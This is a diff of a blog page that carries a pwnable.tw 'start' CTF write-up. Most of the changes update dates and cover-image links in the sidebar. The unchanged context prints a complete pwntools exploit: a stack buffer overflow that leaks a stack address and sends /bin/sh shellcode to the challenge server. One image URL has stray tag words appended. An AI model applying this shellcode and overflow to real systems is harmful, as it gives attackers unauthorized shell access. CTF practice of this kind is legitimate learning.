@@ -303,7 +303,7 @@
 
 	<a href="/pwnable-tw-start.html" itemprop="url">
 		<time datetime="2019-08-11T03:54:32.000Z" itemprop="dateUpdated">
-	  		2019-08-11
+	  		2019-11-25
 	  </time>
 	</a> 
 
@@ -349,7 +349,7 @@
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pro = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">shellcode = asm('\n'.join([</span></span><br><span class="line"><span class="string">    'push %d' % u32('/sh\0'),</span></span><br><span class="line"><span class="string">    'push %d' % u32('/bin'),</span></span><br><span class="line"><span class="string">    'xor edx, edx',</span></span><br><span class="line"><span class="string">    'xor ecx, ecx',</span></span><br><span class="line"><span class="string">    'mov ebx, esp',</span></span><br><span class="line"><span class="string">    'mov eax, 0xb',</span></span><br><span class="line"><span class="string">    'int 0x80',</span></span><br><span class="line"><span class="string">]))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pro.readuntil(<span class="string">"CTF:"</span>)</span><br><span class="line">pro.send(<span class="string">'a'</span>*<span class="number">20</span> + p32(ret))</span><br><span class="line">shell_addr = u32(pro.recv()[:<span class="number">4</span>])</span><br><span class="line">pro.send(<span class="string">'A'</span>*<span class="number">20</span>+p32(shell_addr+<span class="number">20</span>)+shellcode)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>	
 	</div>
 	
-	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+	<div id="current-post-cover" data-scr="https://sariay.github.io/Random-img/16.jpg"></div>
 
 	<!-- relate post, comment...-->
 	<div class="investment-container">
@@ -409,7 +409,7 @@
 						<div class="relate-post-cover">
 							<a href="/Heap的学习-1.html" title="Heap的学习(1)">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Heap的学习(1)">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/15.jpg" alt="Heap的学习(1)">
 							</a>
 						</div>
 					</li>											
@@ -435,7 +435,7 @@ RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味�
 						<div class="relate-post-cover">
 							<a href="/PWN-学习—某平台ROP2-writeup.html" title="PWN 学习—某平台ROP2 writeup">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="PWN 学习—某平台ROP2 writeup">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/4.jpg - writeup - pwntools - pwn - rop" alt="PWN 学习—某平台ROP2 writeup">
 							</a>
 						</div>
 					</li>											
@@ -464,7 +464,7 @@ exp1234567891011121314...
 						<div class="relate-post-cover">
 							<a href="/掘安RE_crypto.html" title="jactf-reverse3">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="jactf-reverse3">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/40.jpg" alt="jactf-reverse3">
 							</a>
 						</div>
 					</li>											
@@ -492,7 +492,7 @@ This is my TODO…
 						<div class="relate-post-cover">
 							<a href="/TODO.html" title="TODO...">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="TODO...">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/25.jpg" alt="TODO...">
 							</a>
 						</div>
 					</li>											
@@ -548,7 +548,7 @@ LZW就是通过建立一个字符串表，用较短的代码来表示较长的�
 						<div class="relate-post-cover">
 							<a href="/LZW无损压缩算法.html" title="LZW无损压缩算法">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="LZW无损压缩算法">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/27.jpg" alt="LZW无损压缩算法">
 							</a>
 						</div>
 					</li>											
@@ -572,7 +572,7 @@ LZW就是通过建立一个字符串表，用较短的代码来表示较长的�
 						<div class="relate-post-cover">
 							<a href="/目录遍历到递归.html" title="目录遍历到递归">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="目录遍历到递归">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/2.jpg" alt="目录遍历到递归">
 							</a>
 						</div>
 					</li>											
@@ -617,7 +617,7 @@ admin
 						<div class="relate-post-cover">
 							<a href="/Sudo提权漏洞复现.html" title="Sudo提权漏洞复现">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Sudo提权漏洞复现">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/10.jpg" alt="Sudo提权漏洞复现">
 							</a>
 						</div>
 					</li>											
@@ -644,7 +644,7 @@ X64：x86是intel推出的复杂指令集，后来amd拓展了X86指令集，称
 						<div class="relate-post-cover">
 							<a href="/段的机制浅析.html" title="段的机制浅析">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="段的机制浅析">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/17.jpg" alt="段的机制浅析">
 							</a>
 						</div>
 					</li>											
@@ -674,7 +674,7 @@ ida打开程序定位WinMain函数
 						<div class="relate-post-cover">
 							<a href="/KCTF-1.html" title="KCTF-1">				
 								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="KCTF-1">
+								<img class="lazy" src="/img/placeholder.jpg" data-src="https://sariay.github.io/Random-img/28.jpg" alt="KCTF-1">
 							</a>
 						</div>
 					</li>											
